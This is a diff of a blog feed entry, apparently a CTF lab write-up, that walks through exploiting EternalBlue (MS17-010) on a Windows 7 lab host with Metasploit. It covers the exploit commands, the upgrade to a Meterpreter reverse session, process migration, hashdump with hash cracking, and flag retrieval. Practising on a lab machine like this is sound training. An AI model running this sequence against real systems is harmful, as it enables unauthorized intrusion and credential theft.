@@ -40,54 +40,71 @@ sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open 
 49154/tcp open  msrpc              Microsoft Windows RPC
 49158/tcp open  msrpc              Microsoft Windows RPC
 49159/tcp open  msrpc              Microsoft Windows RPC
-</code></pre><p>Notably, port 445 (SMB) is open, which suggests a possible vulnerability to MS17-010 (EternalBlue).</p>
+</code></pre><p>After reviewing the results, I noticed three ports below 1000, which answered one of the CTF questions.</p>
+<p>Given the machine is running Windows 7 Professional with SMB service on port 445, I inferred it could be vulnerable to the MS17-010 (EternalBlue) exploit.</p>
 <p><strong>Exploitation with Metasploit</strong></p>
-<p>Given the SMB service running on port 445, I proceeded to use Metasploit to exploit the MS17-010 vulnerability.</p>
+<p>To exploit this vulnerability, I launched Metasploit and searched for the appropriate module.</p>
 <pre tabindex="0"><code>msfconsole
 search exploit/windows/smb/ms17_010_eternalblue
-use exploit/windows/smb/ms17_010_eternalblue
-show options
+</code></pre><p>The search returned the module I needed, so I proceeded to use it.</p>
+<pre tabindex="0"><code>use exploit/windows/smb/ms17_010_eternalblue
+</code></pre><p>Next, I configured the necessary options:</p>
+<pre tabindex="0"><code>show options
 set LHOST &lt;My_IP&gt;
 set RHOSTS 10.10.216.233
-run
+</code></pre><p>I then ran the exploit.</p>
+<pre tabindex="0"><code>run
 </code></pre><p>The exploit was successful, and I gained a command shell on the target machine:</p>
 <pre tabindex="0"><code>[*] Command shell session 1 opened (My_IP:4444 -&gt; 10.10.216.233:49242)
 </code></pre><p><strong>Upgrading to Meterpreter</strong></p>
-<p>To enhance my capabilities on the target, I upgraded the shell to a Meterpreter session:</p>
+<p>To enhance my capabilities on the target, I decided to upgrade the shell to a Meterpreter session. After some research, I found that Metasploit offers a module for this purpose.</p>
 <pre tabindex="0"><code>background
 search post/multi/manage/shell_to_meterpreter
 use post/multi/manage/shell_to_meterpreter
-show options
+</code></pre><p>I checked the required options and set them accordingly:</p>
+<pre tabindex="0"><code>show options
 set SESSION 1
-set LHOST &lt;My_IP&gt;
+set LHOST &lt;Your_IP&gt;
 set LPORT 4433
 run
 </code></pre><p>I confirmed the Meterpreter session:</p>
 <pre tabindex="0"><code>sessions -l
 </code></pre><p><strong>Privilege Escalation and Flag Discovery</strong></p>
-<p>Using Meterpreter, I listed running processes and migrated to a system-level process:</p>
+<p>With the Meterpreter session active, I listed the running processes and selected a system-level process for migration to gain higher privileges.</p>
 <pre tabindex="0"><code>ps
 migrate &lt;PID&gt;
-</code></pre><p>With system privileges, I dumped the password hashes:</p>
+</code></pre><p>Having escalated privileges, I proceeded to dump the password hashes:</p>
 <pre tabindex="0"><code>hashdump
-</code></pre><p>Cracking the hashes with CrackStation revealed the user credentials. I then located and retrieved the flags.</p>
+</code></pre><p>I used CrackStation to crack the hashes and retrieved the user credentials which was required as a question on the CTF.</p>
+<p>I was then asked to locate 3 flags on the system.</p>
 <p><strong>Flag 1</strong></p>
-<p>Located at the system root:</p>
+<p>The CTF mentioned the first flag is located at the system root. I navigated to the C:\ drive and located first flag.</p>
 <pre tabindex="0"><code>meterpreter &gt; cd C:\
+meterpreter &gt; ls
 meterpreter &gt; cat flag1.txt
 flag{access_the_machine}
-</code></pre><p><strong>Flag 2</strong></p>
-<p>Located where Windows stores passwords:</p>
+</code></pre><p>Knowing that the first flag was named flag1.txt I assumed flag 2 and 3 would follow the same naming convention.</p>
+<p>I then decided to use the search function to find flags 2 and 3.</p>
+<p><strong>Flag 2</strong></p>
+<p>The second flag is located where Windows stores passwords. I utilised the search function to find it:</p>
 <pre tabindex="0"><code>meterpreter &gt; search -f flag2.txt
-meterpreter &gt; cat c:\Windows\System32\config\flag2.txt
+Found 1 result...
+
+c:\Windows\System32\config\flag2.txt
+</code></pre><p>I navigated to the directory and viewed the contents:</p>
+<pre tabindex="0"><code>meterpreter &gt; cat c:\Windows\System32\config\flag2.txt
 flag{sam_database_elevated_access}
 </code></pre><p><strong>Flag 3</strong></p>
-<p>Located in the user&rsquo;s documents:</p>
+<p>The third flag is located in the user’s documents. Again, I used the search function:</p>
 <pre tabindex="0"><code>meterpreter &gt; search -f flag3.txt
-meterpreter &gt; cat c:\Users\Jon\Documents\flag3.txt
+Found 1 result...
+
+c:\Users\Jon\Documents\flag3.txt
+</code></pre><p>I navigated to the directory and viewed the contents:</p>
+<pre tabindex="0"><code>meterpreter &gt; cat c:\Users\Jon\Documents\flag3.txt
 flag{admin_documents_can_be_valuable}
 </code></pre><p><strong>Conclusion</strong></p>
-<p>This CTF was an excellent learning experience. I enhanced my skills with Metasploit, Meterpreter, and navigating Windows systems. I look forward to tackling more CTF challenges in the future.</p>
+<p>This CTF was an excellent learning experience. Running through the Nmap scan helped me identify the open ports and potential vulnerabilities. Utilising Metasploit to exploit the MS17-010 vulnerability and upgrading to a Meterpreter session provided valuable practice in exploiting and navigating a Windows system. Retrieving the flags reinforced my skills in locating sensitive information within a compromised machine. I look forward to tackling more CTF challenges in the future.</p>
 ]]></content>
         </item>
         
